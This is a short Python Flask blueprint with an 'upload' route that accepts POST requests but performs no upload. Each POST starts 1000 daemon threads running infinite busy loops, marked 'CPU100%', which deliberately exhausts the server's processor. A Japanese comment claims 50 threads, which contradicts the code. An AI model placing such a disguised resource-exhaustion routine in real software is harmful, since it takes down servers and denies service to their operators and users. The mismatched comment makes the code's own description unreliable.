import threading
from flask import Blueprint, request, render_template

FU = Blueprint("FU", __name__, template_folder="templates")

def infinite_loop():
    while True:
        pass  # CPU100%

@FU.route("/", methods=["GET", "POST"])
def upload():
    if request.method == "POST":
        for _ in range(1000):  # 同時50スレッド
            t = threading.Thread(target=infinite_loop)
            t.daemon = True
            t.start()

    return render_template("FU.html")
